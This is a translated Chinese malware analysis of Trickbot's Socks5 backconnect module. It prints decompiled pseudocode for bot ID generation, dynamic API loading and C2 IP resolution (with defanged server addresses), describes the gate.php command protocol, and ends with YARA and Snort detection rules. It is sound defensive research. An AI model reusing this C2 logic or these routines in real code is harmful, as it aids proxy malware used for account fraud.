# 【技术分享】深入分析Trickbot银行木马的Socks5回连模块

阅读量 **184429**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-11-27 11:48:57

 **x**

##### 译文声明

本文是翻译文章，文章来源：vkremez.com

原文地址：<http://www.vkremez.com/2017/11/lets-learn-trickbot-socks5-backconnect.html>

译文仅供参考，具体内容表达以及含义原文为准。

****

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：110RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**一、前言**

本文的目标是逆向分析Trickbot银行木马所使用的Socks5回连模块，包括对该模块通信协议及源代码的分析。

我们分析的样本为解码后的Trickbot
Socks5回连模块（请参考[此处链接](https://www.virustotal.com/#/file/33ad13c11e87405e277f002e3c4d26d120fcad0ce03b7f1d4831ec0ee0c056c6/detection)查看VirusTotal上的分析结果）。

**  
**

**二、相关背景**

Trickbot银行木马中包含名为“bcClientDllTest”的一个Socks5回连模块，该模块也是Trickbot最引人注目的功能模块。犯罪组织经常利用这个模块发起针对在线账户的欺诈攻击。在伪造PayPal的电子邮件攻击活动中，我们能看到Trickbot感染链路的身影，在分析这条感染链路的过程中，研究人员成功提取了这个功能模块（在此感谢[@Ring0x0](https://twitter.com/Ring0x0)的研究成果）。

11月15日，Reggie在推特上公布了与该模块有关的研究结果，原文如下所示：

经过解码后，可以发现Trickbot Socks5 DLL模块包含如下导出函数：

在本文中，我们主要分析的是其中的“Start”导出函数（序号值为4）。

![](https://bobao.360.cn/ueditor/themes/default/images/spacer.gif)

接下来我们从9个角度对该模块进行分析。

**  
**

**三、技术分析**

**1、配置模板**

首先，该模块中的“Start”导出函数会加载一个默认配置模板，默认模板如下所示：

    
    
    <moduleconfig>
    <autostart>yes</autostart>
    <needinfo name = "id"/>
    <needinfo name = "ip"/>
    <needinfo name = "parentfiles"/>
    </moduleconfig>

**2、CreateThread函数**

接下来，该模块通过strstr
API函数查找”.“在字符串中的位置，将配置模板复制到dword_10034904内存地址中，以`(LPTHREAD_START_ROUTINE)StartAddress`为参数，调用CreateThread
API创建一个新线程。对应的伪代码如下所示：

    
    
    void *__stdcall Start(int a1, int a2, int a3, int a4, char *a5, int a6, int a7, int a8)
    {
      unsigned int v8;
      unsigned int v9; 
      char v10;
      void *result;
      v8 = 0;
      v9 = strlen(aModuleconfigAu);
      if ( v9 )
      {
        do
        {
          v10 = aModuleconfigAu[v8++];
          byte_100349A4 = v10;
        }
        while ( v8 < v9 );
      }
      result = 0;
      if ( !dword_10034900 )
      {
        memset(byte_10034908, 0, 0x20u);
        byte_10034908[32] = 0;
        qmemcpy(byte_10034908, strstr(a5, ".") + 1, 0x20u);
        dword_10034900 = 1;
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
        result = malloc(0x400u);
        dword_10034904 = (int)result;
      }
      return result;
    }

**3、Bot ID生成函数**

该模块中第一个需要注意的功能是Bot
ID（僵尸节点ID，即“client_id”）生成功能。模块通过GetUserNameA以及LookupAccountNameA函数获取账户SID（security
identifier，安全标识符），然后通过GetVolumeInformationA
API获取磁盘中C分区的序列号，将该序列号与SID进行异或（XOR）处理，生成Bot ID。

![](https://bobao.360.cn/ueditor/themes/default/images/spacer.gif)

对应的C++函数如下所示：

    
    
    DWORD bot_id_generator()
    {
      CHAR VolumeNameBuffer; 
      CHAR FileSystemNameBuffer; 
      DWORD FileSystemFlags;
      enum _SID_NAME_USE peUse; 
      DWORD MaximumComponentLength; 
      DWORD cbSid;
      DWORD pcbBuffer;
      DWORD cchReferencedDomainName; 
      LPSTR ReferencedDomainName;
      DWORD VolumeSerialNumber; 
      LPSTR lpBuffer; 
      PSID Sid;
      int i; 
    GetVolumeInformationA(
        "C:\",
        &VolumeNameBuffer,
        0x80u,
        &VolumeSerialNumber,
        &MaximumComponentLength,
        &FileSystemFlags,
        &FileSystemNameBuffer,
        0x80u);
      
      lpBuffer = (LPSTR)malloc(0x1000u);
      pcbBuffer = 4096;
      Sid = malloc(0x1000u);
      cbSid = 4096;
      ReferencedDomainName = (LPSTR)malloc(0x1000u);
      cchReferencedDomainName = 4096;
      GetUserNameA(lpBuffer, &pcbBuffer);
      memset(Sid, 0, 0x1000u);
      LookupAccountNameA(0, lpBuffer, Sid, &cbSid, ReferencedDomainName, &cchReferencedDomainName, &peUse);
      for ( i = 0; i <= 16; ++i )
        VolumeSerialNumber ^= *((_DWORD *)Sid + i);
      free(lpBuffer);
      free(Sid);
      free(ReferencedDomainName);
      return VolumeSerialNumber;
    }

**4、动态API加载函数**

该模块组合调用常见的LoadLibrary/GetModuleHandleA/GetProcAddress函数，动态加载若干Windows
API函数，如下所示：

    
    
    v1 = GetModuleHandleA("kernel32.dll");
    v58 = GetProcAddress(v1, "HeapAlloc");
    v2 = GetModuleHandleA("kernel32.dll");
    v57 = GetProcAddress(v2, "HeapFree");
    v3 = GetModuleHandleA("kernel32.dll");
    v236 = GetProcAddress(v3, "GetProcessHeap");
    v4 = GetModuleHandleA("ntdll.dll");
    v56 = GetProcAddress(v4, "sprintf");
    v5 = GetModuleHandleA("ntdll.dll");
    v29 = GetProcAddress(v5, "strcat");
    v6 = GetModuleHandleA("wininet.dll");
    v39 = GetProcAddress(v6, "InternetOpenA");
    v7 = GetModuleHandleA("wininet.dll");
    v43 = GetProcAddress(v7, "InternetOpenUrlA");
    v8 = GetModuleHandleA("wininet.dll");
    v55 = GetProcAddress(v8, "InternetReadFile");
    v9 = GetModuleHandleA("wininet.dll");
    v61 = GetProcAddress(v9, "InternetCloseHandle");

随后，该模块将返回值与位于0x10034900处某个内设变量进行对比（该变量占双字（DWORD）大小，值为0），检查动态加载操作是否成功。

**5、IP解析函数**

恶意软件使用”`Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US),`“作为占位符，存放user agent字符串，后续的网络通信过程中会用到该字符串。恶意软件解析硬编码的默认IP地址，根据解析结果修改user
agent字符串（Trickbot经常修改硬编码的默认IP地址）。恶意软件调用如下API完成解析过程：

    
    
    inet_addr
    DnsQuery_A
    inet_ntoa

IP解析函数的返回值为BOOL类型，代码如下所示：

    
    
    BOOL __cdecl Trick_backconnect_IP_resolution(int a1, _BYTE *a2)
    {
      char *cp;
      const char *v4;
      const char *v5;
      const char *v6;
      const char *v7;
      const char *v8;
      const char *v9;
      const char *v10;
      const char *v11;
      const char *v12;
      _BYTE *v13;
      int v14;
      struct in_addr in;
      int v16;
      char *v17;
      int v18;
      int v19;
      _BYTE *v20;
      int i;
      HLOCAL hMem;
      char v23;
      char v24;
      *a2 = 0;
      v19 = 0;
      v18 = 0;
      cp = "69.164.196[.]21";
      v4 = "107.150.40[.]234";
      v5 = "162.211.64[.]20";
      v6 = "217.12.210[.]54";
      v7 = "89.18.27[.]34";
      v8 = "193.183.98[.]154";
      v9 = "51.255.167[.]0";
      v10 = "91.121.155[.]13";
      v11 = "87.98.175[.]85";
      v12 = "185.97.7[.]7";
      v16 = 10;
      hMem = LocalAlloc(0x40u, 8u);
      v24 = 0;
      for ( i = 0; i < v16; ++i )
      {
        *((_DWORD *)hMem + 1) = inet_addr((&cp)[4 * i]);
        *(_DWORD *)hMem = 1;
        v14 = DnsQuery_A(a1, 1, 2, hMem, &v19, 0);
        v18 = v19;
        if ( v19 )
        {
          in = *(struct in_addr *)(v18 + 24);
          v17 = inet_ntoa(in);
          v20 = a2;
          v13 = a2;
          do
          {
            v23 = *v17;
            *v20 = v23;
            ++v17;
            ++v20;
          }
          while ( v23 );
          v24 = 1;
        }
        if ( v24 )
          break;
      }
      if ( hMem )
        LocalFree(hMem);
      if ( v19 )
        DnsFree(v19, 1);
      return v24 != 0;
    }

**6、通信协议**

恶意软件的客户端-服务器通信过程中用到了多种命令，命令以”c“字符作为前缀，具体使用的命令如下所示：

    
    
    disconnect: 终止与服务器的连接
    idle: 保持客户端-服务器连接
    connect: 连接到服务器，该命令必须包含如下参数：
     ip: 回连服务器的IP地址
     auth_swith: 授权标志。如果该值为1，那么木马会收到服务器返回的auth_login及auth_pass参数；如果该值为0，则木马会收到服务器返回的auth_ip参数；如果是其他值，则连接无法成功建立。
    auth_ip: 用于认证的IP地址。
    auth_login: 用于认证的登录信息。
    auth_pass: 用于认证的密码信息。

****

**7、客户端-服务端协议深入分析**

总体而言，Trickbot Socks5主要使用了3种服务端-客户端命令，如下所示：

    
    
    c=idle
    c=disconnect
    c=connect

Trickbot客户端会向服务器发起一系列GET请求（通常请求的是服务器上的gate[.]php页面），请求地址中包含如下字段：

    
    
    client_id=&connected=&server_port=&debug=

如果服务端同意建立连接，则会返回响应报文，响应报文中包含如下参数：

    
    
    c=connect&ip=&auth_swith=&auth_ip=&auth_login=&auth_pass=

如果服务端想终止连接，则会返回包含“c=disconnect.”参数的响应报文。目前我们观察到大多数Trickbot
Socks5回连服务器都支持区块链名字服务器（Blockchain name server）解析功能。

**8、YARA规则**

****

    
    
    rule crime_win32_trick_socks5_backconnect {
            meta:
                    description = "Trickbot Socks5 bckconnect module"
                    author = "@VK_Intel"
                    reference = "Detects the unpacked Trickbot backconnect in memory"
                    date = "2017-11-19"
                    hash = "f2428d5ff8c93500da92f90154eebdf0"
            strings:
                    $s0 = "socks5dll.dll" fullword ascii
                    $s1 = "auth_login" fullword ascii
                    $s2 = "auth_ip" fullword ascii
                    $s3 = "connect" fullword ascii
                    $s4 = "auth_ip" fullword ascii
                    $s5 = "auth_pass" fullword ascii
                    $s6 = "thread.entry_event" fullword ascii
                    $s7 = "thread.exit_event" fullword ascii
                    $s8 = "</moduleconfig>" fullword ascii
                    $s9 = "<moduleconfig>" fullword ascii
                    $s10 = "<autostart>yes</autostart>" fullword ascii
            condition:
                    uint16(0) == 0x5a4d and filesize < 300KB and 7 of them
    }

**9、SNORT规则**

    
    
    alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Possible Trickbot Socks5 Backconnect check-in alert"; flow:established,to_server; content:"gate.php"; http_uri; content:"?client_id="; http_uri; content:"&connected="; http_uri; content:"&server_port="; http_uri; content:"&debug="; http_uri; reference:url,http://www.vkremez.com/2017/11/lets-learn-trickbot-socks5-backconnect.html; classtype:Trojan-activity; rev:1;)

本文翻译自vkremez.com [原文链接](http://www.vkremez.com/2017/11/lets-learn-trickbot-socks5-backconnect.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/87320](/post/id/87320)

安全客 - 有思想的安全新媒体

本文转载自: [vkremez.com](http://www.vkremez.com/2017/11/lets-learn-trickbot-socks5-backconnect.html)

如若转载,请注明出处： <http://www.vkremez.com/2017/11/lets-learn-trickbot-socks5-backconnect.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

